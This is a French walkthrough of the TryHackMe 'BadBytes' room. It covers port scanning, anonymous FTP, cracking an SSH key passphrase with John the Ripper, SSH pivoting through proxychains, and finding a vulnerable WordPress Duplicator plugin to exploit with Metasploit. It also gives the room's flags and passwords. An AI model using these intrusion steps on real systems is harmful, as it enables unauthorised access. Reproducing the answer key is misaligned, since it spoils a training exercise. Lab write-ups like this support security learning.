## BadBytes

Mes images ; https://medium.com/@BaldrTheKing/tryhackme-badbytes-74d697a63e72 

Reconnaissance;     
1. nmap -p- -Pn -T5 [IP]
2. nmap -p22,30024 -sC -sV [IP]

How many ports are open ? 2     
What service is running on the lowest open port? ssh    
What non-standard port is open? 30024 
What non-standard port is open? ftp

Le port non standard est le service ftp qui "normalement" est présent sur le 20 et 21. Mais souvent dans les challenges, il est caché ailleurs.

On peut se connecter sans mot de passe au service ftp   
command; ftp [IP] 30024 => entrer anonymous et espace
get [nom du fichier] pour télécharger les fichiers qui sont nécessaires. 

Foothold;   
1. dans le fichier notes.txt => on a un nom d'utilisateur "errorcauser"
2. /opt/john/ssh2john.py id_rsa > privatekey.hash
3. john privatekey.hash -w=/usr/share/wordlists/rockyou.txt

What username do we find during the enumeration process? errorcauser    
What is the passphrase for the RSA private key? cupcake 

Port Forwarding;
1.	ssh -i id_rsa -D 1337 errorcauser@[IP]
2. /etc/proxychains.conf (AttackBox de TryHackMe) il faut ajouter la ligne:  
socks5 127.0.0.1 1337   
il faut aussi changer static_chain pour dynamic_chain (avec le #)
3. proxychains nmap -sT 127.0.0.1 maintenant que c'est mis en place (permet de répondre à la question + pour la quatrième étape)
4. ssh -i id_rsa -L 8000:127.0.0.1:80 errorcauser@[IP] on fait le local port forwarding. Ca va nous permettre d'atteindre le site sur 127.0.0.1:8000 (le port 8000 est un choix perso, le port 80 c'est le résultat de nmap)

What main TCP ports are listening on localhost? 80,3306
What protocols are used for these ports? http,mysql

Web;

nmap -sC -p 8000 127.0.0.1
What CMS is running on the machine? Wordpress

nmap --script http-wordpress-enum -p 8000 127.0.0.1 
Can you find any vulnerable plugins? duplicator 1.3.26

What is the CVE number for directory traversal vulnerability?  CVE-2020-11738   
What is the CVE number for remote code execution vulnerability?
CVE-2020-25213

Dans metasploit, on utilise l'exploit qu'on peut trouver ici en tapant  
search CVE-2020-2513 

What is the name of user that was running CMS? cth  


What is the user flag? THM{227906201d17d9c45aa93d0122ea1af7}    
What is the user's old password? G00dP@$sw0rd2020 (dans /var/log dans bash.log)

On peut se connecter avec le nouveau mot de passe G00dP@$sw0rd2021 en tant que cth  

What is the root flag? THM{ad485b44f63393b6a9225974909da5fa} 

